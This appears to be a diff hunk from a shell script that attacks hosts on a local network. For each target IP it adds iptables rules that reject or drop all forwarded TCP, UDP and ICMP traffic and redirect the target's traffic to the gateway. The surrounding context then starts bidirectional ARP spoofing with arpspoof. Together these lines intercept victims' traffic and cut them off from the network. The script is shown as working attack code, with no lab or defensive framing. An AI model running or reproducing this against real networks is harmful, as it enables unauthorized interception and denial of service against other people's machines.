@@ -143,9 +143,12 @@ for TARGET in $TARGET_IPS; do
         sudo iptables -P FORWARD DROP
         sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
         sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-        sudo iptables -t nat -A PREROUTING -d "$TARGET" -j DNAT --to-destination "$GATEWAY"  
+        sudo iptables -t nat -A PREROUTING -d "$TARGET" -j DNAT --to-destination "$GATEWAY"
+        sudo iptables -A FORWARD -d "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
+        sudo iptables -A FORWARD -d "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
+        sudo iptables -A FORWARD -d "$TARGET" -p icmp -j REJECT --reject-with icmp-host-unreachable
         sudo iptables -A FORWARD -s "$TARGET" -j DROP
-        sudo iptables -A FORWARD -d "$TARGET" -j DROP  
+        sudo iptables -A FORWARD -d "$TARGET" -j DROP
      (
         # Bidirectional ARP Spoofing
        sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
